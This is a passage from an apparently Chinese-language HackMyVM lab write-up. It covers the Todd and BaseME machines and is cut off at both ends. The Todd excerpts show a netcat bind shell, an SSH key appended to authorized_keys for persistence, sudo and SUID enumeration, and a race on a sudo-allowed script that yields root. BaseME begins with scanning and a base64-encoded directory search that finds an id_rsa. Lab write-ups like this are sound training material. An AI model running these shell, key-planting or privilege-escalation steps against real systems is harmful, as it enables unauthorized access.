/<span class="built_in">bin</span>/bash /opt/create_nc.sh </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">1000</span>  PID=<span class="number">2500</span>   | nc -e /opt/fake_ssh -lp <span class="number">3080</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2499</span>   | sudo -u todd nc -e /opt/fake_ssh -lp <span class="number">3080</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2497</span>   | /<span class="built_in">bin</span>/bash /opt/create_nc.sh </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">1000</span>  PID=<span class="number">2496</span>   | nc -e /opt/fake_ssh -lp <span class="number">8824</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2495</span>   | sudo -u todd nc -e /opt/fake_ssh -lp <span class="number">8824</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2493</span>   | /<span class="built_in">bin</span>/bash /opt/create_nc.sh </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">1000</span>  PID=<span class="number">2492</span>   | nc -e /opt/fake_ssh -lp <span class="number">1651</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2491</span>   | sudo -u todd nc -e /opt/fake_ssh -lp <span class="number">1651</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2489</span>   | /<span class="built_in">bin</span>/bash /opt/create_nc.sh </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">1000</span>  PID=<span class="number">2488</span>   | nc -e /opt/fake_ssh -lp <span class="number">19038</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2486</span>   | sudo -u todd nc -e /opt/fake_ssh -lp <span class="number">19038</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2484</span>   | /<span class="built_in">bin</span>/bash /opt/create_nc.sh </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">1000</span>  PID=<span class="number">2483</span>   | nc -e /opt/fake_ssh -lp <span class="number">23576</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2482</span>   | sudo -u todd nc -e /opt/fake_ssh -lp <span class="number">23576</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2480</span>   | /<span class="built_in">bin</span>/bash /opt/create_nc.sh </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">1000</span>  PID=<span class="number">2479</span>   | bash </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">1000</span>  PID=<span class="number">2478</span>   | nc -e /opt/fake_ssh -lp <span class="number">32418</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2477</span>   | sudo -u todd nc -e /<span class="built_in">bin</span>/bash -lp <span class="number">7066</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2476</span>   | sudo -u todd nc -e /opt/fake_ssh -lp <span class="number">32418</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2474</span>   | /<span class="built_in">bin</span>/bash /opt/create_nc.sh </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2473</span>   | /<span class="built_in">bin</span>/bash /opt/create_nc2.sh </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>存在定时任务，一直在监听靶机端口</p>
<p>这里发现靶机一直掉线的原因了，我们把没用的定时任务删除就可以一直维持连接状态了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/dirsearch-master]</span><br><span class="line">└─$ nc <span class="number">192.168</span><span class="number">.56</span><span class="number">.28</span> <span class="number">7066</span>   </span><br><span class="line">/opt/create_nc2.sh</span><br><span class="line">cd /opt              </span><br><span class="line">ls</span><br><span class="line">create_nc2.sh</span><br><span class="line">create_nc.sh</span><br><span class="line">fake_ssh</span><br><span class="line">kill_todd.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来将id_rsa写入目标靶机，实现ssh直接登录</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">cd /home/todd</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">user.txt</span><br><span class="line">$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total <span class="number">24</span></span><br><span class="line">drwxr-xr-x <span class="number">2</span> todd todd <span class="number">4096</span> Mar <span class="number">22</span> 08:03 .</span><br><span class="line">drwxr-xr-x <span class="number">3</span> root root <span class="number">4096</span> Mar <span class="number">22</span> 06:<span class="number">53</span> ..</span><br><span class="line">lrwxrwxrwx <span class="number">1</span> root root    <span class="number">9</span> Mar <span class="number">22</span> 08:03 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- <span class="number">1</span> todd todd  <span class="number">220</span> Apr <span class="number">18</span>  <span class="number">2019</span> .bash_logout</span><br><span class="line">-rw-r--r-- <span class="number">1</span> todd todd <span class="number">3526</span> Apr <span class="number">18</span>  <span class="number">2019</span> .bashrc</span><br><span class="line">-rw-r--r-- <span class="number">1</span> todd todd  <span class="number">807</span> Apr <span class="number">18</span>  <span class="number">2019</span> .profile</span><br><span class="line">-rw-r--r-- <span class="number">1</span> todd todd   <span class="number">39</span> Mar <span class="number">22</span> 06:<span class="number">54</span> user.txt</span><br><span class="line">$ mkdir .ssh</span><br><span class="line">mkdir .ssh</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">user.txt</span><br><span class="line">$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total <span class="number">28</span></span><br><span class="line">drwxr-xr-x <span class="number">3</span> todd todd <span class="number">4096</span> Apr <span class="number">28</span> <span class="number">21</span>:<span class="number">24</span> .</span><br><span class="line">drwxr-xr-x <span class="number">3</span> root root <span class="number">4096</span> Mar <span class="number">22</span> 06:<span class="number">53</span> ..</span><br><span class="line">lrwxrwxrwx <span class="number">1</span> root root    <span class="number">9</span> Mar <span class="number">22</span> 08:03 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- <span class="number">1</span> todd todd  <span class="number">220</span> Apr <span class="number">18</span>  <span class="number">2019</span> .bash_logout</span><br><span class="line">-rw-r--r-- <span class="number">1</span> todd todd <span class="number">3526</span> Apr <span class="number">18</span>  <span class="number">2019</span> .bashrc</span><br><span class="line">-rw-r--r-- <span class="number">1</span> todd todd  <span class="number">807</span> Apr <span class="number">18</span>  <span class="number">2019</span> .profile</span><br><span class="line">drwxr-xr-x <span class="number">2</span> todd todd <span class="number">4096</span> Apr <span class="number">28</span> <span class="number">21</span>:<span class="number">24</span> .ssh</span><br><span class="line">-rw-r--r-- <span class="number">1</span> todd todd   <span class="number">39</span> Mar <span class="number">22</span> 06:<span class="number">54</span> user.txt</span><br><span class="line">$ cd .ssh</span><br><span class="line">cd .ssh</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">$ echo <span class="string">&quot;ssh-rsa </span></span><br><span class="line"><span class="string">               kali@kali&quot;</span> &gt;&gt; ~/.ssh/authorized_keys    </span><br><span class="line">echo <span class="string">&quot;ssh-rsa </span></span><br><span class="line"><span class="string">               kali@kali&quot;</span> &gt;&gt; ~/.ssh/authorized_keys</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">authorized_keys</span><br><span class="line">$ cat authorized_keys</span><br><span class="line">cat authorized_keys</span><br><span class="line">ssh-rsa     </span><br><span class="line">             kali@kali</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/dirsearch-master]</span><br><span class="line">└─$ ssh todd@<span class="number">192.168</span><span class="number">.56</span><span class="number">.28</span> </span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.56.28 (192.168.56.28)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:rXcjV9xeZG+J6KZLTr1t2Xi2ErBvMauXjxH4EBvhV0c.</span></span><br><span class="line"><span class="string">This host key is known by the following other names/addresses:</span></span><br><span class="line"><span class="string">    ~/.ssh/known_hosts:14: [hashed name]</span></span><br><span class="line"><span class="string">    ~/.ssh/known_hosts:17: [hashed name]</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span><span class="number">192.168</span><span class="number">.56</span><span class="number">.28</span><span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">Linux todd 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=1000(todd) gid=1000(todd) groups=1000(todd)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>



<p>寻找提权思路</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for todd on todd:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User todd may run the following commands on todd:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /bin/bash /srv/guess_and_check.sh</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/rm</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/sbin/reboot</span><br><span class="line">$ cat /srv/guess_and_check.sh</span><br><span class="line">cat /srv/guess_and_check.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">cat &lt;&lt; EOF</span><br><span class="line">                                   .     **</span><br><span class="line">                                *           *.</span><br><span class="line">                                              ,*</span><br><span class="line">                                                 *,</span><br><span class="line">                         ,                         ,*</span><br><span class="line">                      .,                              *,</span><br><span class="line">                    /                                    *</span><br><span class="line">                 ,*                                        *,</span><br><span class="line">               /.                                            .*.</span><br><span class="line">             *                                                  **</span><br><span class="line">             ,*                                               ,*</span><br><span class="line">                **                                          *.</span><br><span class="line">                   **                                    **.</span><br><span class="line">                     ,*                                **</span><br><span class="line">                        *,                          ,*</span><br><span class="line">                           *                      **</span><br><span class="line">                             *,                .*</span><br><span class="line">                                *.           **</span><br><span class="line">                                  **      ,*,</span><br><span class="line">                                     ** *,     HackMyVM</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># check this script used by human </span><br><span class="line">a=$((RANDOM%1000))</span><br><span class="line">echo &quot;Please Input [$a]&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;[+] Check this script used by human.&quot;</span><br><span class="line">echo &quot;[+] Please Input Correct Number:&quot;</span><br><span class="line">read -p &quot;&gt;&gt;&gt;&quot; input_number</span><br><span class="line"></span><br><span class="line">[[ $input_number -ne &quot;$a&quot; ]] &amp;&amp; exit 1</span><br><span class="line"></span><br><span class="line">sleep 0.2</span><br><span class="line">true_file=&quot;/tmp/$((RANDOM%1000))&quot;</span><br><span class="line">sleep 1</span><br><span class="line">false_file=&quot;/tmp/$((RANDOM%1000))&quot;</span><br><span class="line"></span><br><span class="line">[[ -f &quot;$true_file&quot; ]] &amp;&amp; [[ ! -f &quot;$false_file&quot; ]] &amp;&amp; cat /root/.cred || exit 2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分析完代码，是一个检验是否是人类操作的程序</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[ -f <span class="string">&quot;$true_file&quot;</span> ]] &amp;&amp; [[ ! -f <span class="string">&quot;$false_file&quot;</span> ]] &amp;&amp; cat /root/.cred || exit <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p><strong>如果</strong> $true_file 存在 <strong>并且</strong> $false_file 不存在 <strong>并且</strong> 成功读取 &#x2F;root&#x2F;.cred 文件，则返回状态码2</p>
<p>这里是可以尝试提权的，满足一个存在一个不存在即可</p>
<p>我们去&#x2F;tmp下创建1-500命名的文件</p>
<p>这里是有概率成功的，获得了sudo密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">todd@todd:/tmp$ sudo /bin/bash /srv/guess_and_check.sh</span><br><span class="line">                                   .     **</span><br><span class="line">                                *           *.</span><br><span class="line">                                              ,*</span><br><span class="line">                                                 *,</span><br><span class="line">                         ,                         ,*</span><br><span class="line">                      .,                              *,</span><br><span class="line">                    /                                    *</span><br><span class="line">                 ,*                                        *,</span><br><span class="line">               /.                                            .*.</span><br><span class="line">             *                                                  **</span><br><span class="line">             ,*                                               ,*</span><br><span class="line">                **                                          *.</span><br><span class="line">                   **                                    **.</span><br><span class="line">                     ,*                                **</span><br><span class="line">                        *,                          ,*</span><br><span class="line">                           *                      **</span><br><span class="line">                             *,                .*</span><br><span class="line">                                *.           **</span><br><span class="line">                                  **      ,*,</span><br><span class="line">                                     ** *,     HackMyVM</span><br><span class="line">Please Input [378]</span><br><span class="line">[+] Check this script used by human.</span><br><span class="line">[+] Please Input Correct Number:</span><br><span class="line">&gt;&gt;&gt;378</span><br><span class="line">fake password</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@todd:/tmp<span class="comment"># cd /root</span></span><br><span class="line">root@todd:~<span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@todd:~<span class="comment"># cat r*</span></span><br><span class="line">Todd&#123;389c9909b8d6a701217a45104de7aa21&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="BaseME"><a href="#BaseME" class="headerlink" title="BaseME"></a>BaseME</h2><p>扫一下端口，常规22，80</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/baji]</span><br><span class="line">└─$ nmap -Pn -n <span class="number">192.168</span><span class="number">.56</span><span class="number">.34</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2025</span>-05-<span class="number">19</span> <span class="number">22</span>:<span class="number">21</span> EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.56</span><span class="number">.34</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.0021</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  http</span><br><span class="line">MAC Address: 08:<span class="number">00</span>:<span class="number">27</span>:C9:<span class="number">86</span>:EA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">0.30</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>dirsearch扫目录，没扫到啥东西</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/dirsearch-master]</span><br><span class="line">└─$ python dirsearch.py -u http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.34</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0<span class="number">.4</span><span class="number">.3</span></span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: <span class="number">25</span> | Wordlist size: <span class="number">12289</span></span><br><span class="line"></span><br><span class="line">Target: http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.34</span>/</span><br><span class="line"></span><br><span class="line">[<span class="number">22</span>:<span class="number">22</span>:<span class="number">13</span>] Scanning: </span><br><span class="line">[<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>] <span class="number">200</span> -   276B - /index.html                                       </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>

<p>访问ip给了一串base64编码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/dirsearch-master]</span><br><span class="line">└─$ curl  http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.34</span>                                  </span><br><span class="line">QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">iloveyou</span><br><span class="line">youloveyou</span><br><span class="line">shelovesyou</span><br><span class="line">helovesyou</span><br><span class="line">weloveyou</span><br><span class="line">theyhatesme</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/dirsearch-master]</span><br><span class="line">└─$ echo <span class="string">&quot;QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK&quot;</span> | base64 --decode </span><br><span class="line">ALL, absolutely ALL that you need <span class="keyword">is</span> <span class="keyword">in</span> BASE64.</span><br><span class="line">Including the password that you need :)</span><br><span class="line">Remember, BASE64 has the answer to <span class="built_in">all</span> your questions.</span><br><span class="line">-lucas</span><br><span class="line">need <span class="keyword">is</span> <span class="keyword">in</span> BASE64.</span><br><span class="line">Including the password that you need :)</span><br><span class="line">Remember, BASE64 has the answer to <span class="built_in">all</span> your questions.</span><br><span class="line">-lucas</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">所有，你需要的一切都在BASE64中。包括你需要的密码 :) 记住，BASE64有你所有问题的答案。 -lucas</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里猜测目录信息是被base64给编码了</p>
<p>我们把字典编码后重新扫描</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/dirsearch-master]</span><br><span class="line">└─$ python dirsearch.py -w /home/kali/Desktop/dirsearch-master/db/dicc_encoded.txt -u http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.34</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0<span class="number">.4</span><span class="number">.3</span></span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: <span class="number">25</span> | Wordlist size: <span class="number">9674</span></span><br><span class="line"></span><br><span class="line">Target: http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.34</span>/</span><br><span class="line"></span><br><span class="line">[<span class="number">23</span>:<span class="number">12</span>:<span class="number">35</span>] Scanning: </span><br><span class="line">[<span class="number">23</span>:<span class="number">12</span>:<span class="number">42</span>] <span class="number">200</span> -    2KB - /aWRfcnNhCg==      /id_rsa                               </span><br><span class="line">[<span class="number">23</span>:<span class="number">12</span>:<span class="number">45</span>] <span class="number">200</span> -    25B - /cm9ib3RzLnR4dAo=  /robots.txt                               </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 